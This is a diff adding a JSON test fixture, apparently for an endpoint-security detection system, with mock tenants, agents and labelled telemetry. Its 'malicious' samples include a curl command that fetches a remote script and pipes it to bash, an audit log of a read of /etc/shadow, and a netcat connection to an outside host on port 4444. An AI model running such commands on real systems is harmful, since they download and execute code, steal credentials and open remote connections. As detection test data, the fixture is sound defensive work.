@@ -1,0 +1,48 @@
+{
+  "tenants": [
+    {
+      "id": "tenant-test-4011-ab",
+      "name": "Integration Testing Lab Org",
+      "tier": "Enterprise",
+      "encryption_key_arn": "arn:aws:kms:us-east-1:111122223333:key/mock-test-key-id"
+    }
+  ],
+  "agents": [
+    {
+      "id": "agent-test-2022-xyz",
+      "hostname": "TEST-HOST-01",
+      "ip_address": "192.168.12.99",
+      "os_family": "Linux",
+      "os_kernel_version": "Linux 6.1-generic-test",
+      "agent_version": "v1.4.2"
+    }
+  ],
+  "telemetry": {
+    "malicious_curl": {
+      "agent_id": "agent-test-2022-xyz",
+      "events": [
+        {
+          "bin_path": "/usr/bin/curl",
+          "cmdline": "curl -s http://185.120.30.22/payload.sh | bash",
+          "risk_score": 0.95,
+          "timestamp": "2026-06-15T16:15:00Z"
+        }
+      ]
+    },
+    "benign_process": {
+      "agent_id": "agent-test-2022-xyz",
+      "events": [
+        {
+          "bin_path": "/usr/bin/git",
+          "cmdline": "git pull origin master",
+          "risk_score": 0.05,
+          "timestamp": "2026-06-15T16:15:30Z"
+        }
+      ]
+    }
+  },
+  "forensics_logs": {
+    "suspicious_etc_shadow_read": "Jun 15 16:12:15 host-01 auditd[10410]: host=PROD-SYS-SQL03 comm=cat path=/etc/shadow uid=33 euid=0 event=FILE_READ_HIGH_PRIVILEGE\nJun 15 16:12:18 host-01 nc -nv 8.8.8.8 4444",
+    "standard_syslog": "Jun 15 16:12:20 host-01 systemd[1]: Created slice User Slice of UID 1000.\nJun 15 16:12:22 host-01 dbus-daemon[401]: [system] Successfully activated service 'org.freedesktop.fwupd'"
+  }
+}
